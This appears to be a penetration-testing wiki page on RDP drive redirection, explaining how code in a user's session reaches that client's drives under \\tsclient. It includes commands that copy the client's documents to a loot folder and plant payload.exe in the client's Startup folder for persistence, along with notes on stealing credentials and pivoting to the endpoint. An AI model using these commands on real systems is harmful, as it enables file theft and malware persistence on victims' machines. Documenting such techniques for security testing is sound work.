---
title: "Drive redirection: reaching mapped client drives over RDP"
description: "RDP drive redirection maps client drives into a specific remote session under tsclient. An attacker executing in that session can access the drives redirected there, subject to client configuration and file permissions."
keywords:
  - drive redirection
  - tsclient
  - rdpdr
  - file access
  - rdp channel
---

# Drive redirection

RDP can map a client's local drives into its remote session over the `rdpdr` channel, exposing them in that session under `\\tsclient\<drive>`. Code executing in the same session can access those redirected paths, subject to the client's redirection choices and file permissions. The mapping is not host-global: compromising a terminal server does not automatically expose every connected user's client drives. Reaching another user's redirected resources generally requires execution in, or control of, that user's RDP session.

```bash
# from inside the target user's RDP session, access that session's redirected drives
dir \\tsclient\C                                   # the client's C: drive, if redirected
copy \\tsclient\C\Users\<user>\Documents\* C:\loot\   # steal client files
# plant onto the client's drive for execution on their machine
copy payload.exe "\\tsclient\C\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
```

## Exploitation notes

- `\\tsclient\<drive>` is the mapped-drive path inside the current session; enumerate it only after establishing which user's session the process occupies.
- Reading steals the client's files (documents, keys, credentials) from the server side; writing to a redirected drive, where permitted, plants persistence or a payload that runs on the client, pivoting from server to endpoint.
- The reach exists only while that session is connected with drive redirection enabled. Access to other sessions requires separate session control, such as an authorized administrative session-assistance workflow or [session hijacking](session-hijacking.md).
- Combined with [clipboard redirection](clipboard-redirection.md), these channels make a compromised individual session a path back to its connecting client.

## References

- [MS-RDPEFS (file-system virtual channel)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpefs/)
- [HackTricks: RDP drive redirection](https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp)
